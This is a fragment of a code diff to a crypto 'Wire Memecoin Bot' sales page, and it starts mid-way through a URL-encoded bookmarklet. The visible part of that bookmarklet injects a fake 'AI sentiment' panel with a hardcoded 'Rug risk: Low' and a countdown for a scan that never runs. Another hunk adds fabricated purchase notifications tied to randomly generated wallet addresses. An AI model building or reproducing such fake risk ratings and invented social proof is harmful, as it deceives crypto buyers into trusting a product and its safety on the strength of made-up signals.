2%3E%3Cspan%3ERug%20risk%3C%2Fspan%3E%3Cspan%20class%3D%22val%20good%22%3ELow%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3EKOL%20mentions%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%3E7%20active%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3ENext%20scan%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%20id%3D%22wire-ai-tick%22%3E2.4s%3C%2Fspan%3E%3C%2Fdiv%3E';document.body.appendChild(h);var%20t%3D2.4;setInterval(function()%7Bt%3D(t-0.4);if(t%3C%3D0)t%3D2.4;var%20el%3Ddocument.getElementById('wire-ai-tick');if(el)el.textContent%3Dt.toFixed(1)%2B's'%7D,400);console.log('%5BWIRE%20AI%5D%20Sentiment%20scanner%20active')%7D)();"
+       id="sentiment-bookmarklet-link" draggable="true" title="Drag to bookmarks bar for Trading AI Sentiment"
+       style="
+         position: fixed;
+         bottom: 20px;
+         left: 76px;
+         z-index: 90;
+         width: 44px;
+         height: 44px;
+         border-radius: 50%;
+         background: rgba(10, 10, 10, 0.75);
+         border: 1px solid rgba(124, 92, 255, 0.35);
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         font-size: 20px;
+         line-height: 1;
+         text-decoration: none;
+         cursor: grab;
+         backdrop-filter: blur(10px);
+         -webkit-backdrop-filter: blur(10px);
+         box-shadow: 0 4px 20px rgba(124, 92, 255, 0.25);
+         transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
+         user-select: none;
+       "
+       onmouseover="this.style.transform='scale(1.08)'; this.style.borderColor='rgba(124,92,255,0.7)'; this.style.boxShadow='0 4px 24px rgba(124,92,255,0.4)';"
+       onmouseout="this.style.transform='scale(1)'; this.style.borderColor='rgba(124,92,255,0.35)'; this.style.boxShadow='0 4px 20px rgba(124,92,255,0.25)';"
+       onmousedown="this.style.cursor='grabbing';"
+       onmouseup="this.style.cursor='grab';"
+    >&#129302;</a>
 
 </footer>
 
@@ -1885,7 +2076,7 @@ body.loaded .intro.d7{ transition-delay:440ms; }
             for(let i=0; i<4; i++) str2 += chars.charAt(Math.floor(Math.random() * chars.length));
             const wallet = `${str1}...${str2}`;
 
-            const actions = ['purchased the Wire Memecoin Bot', 'created a new Token', 'executed a multi-wallet snipe'];
+            const actions = ['purchased the Wire Memecoin Bot', 'created a new Token', 'activated Fee Reclaimer', 'executed a multi-wallet snipe'];
             const action = actions[Math.floor(Math.random() * actions.length)];
             
             const toast = document.createElement('div');
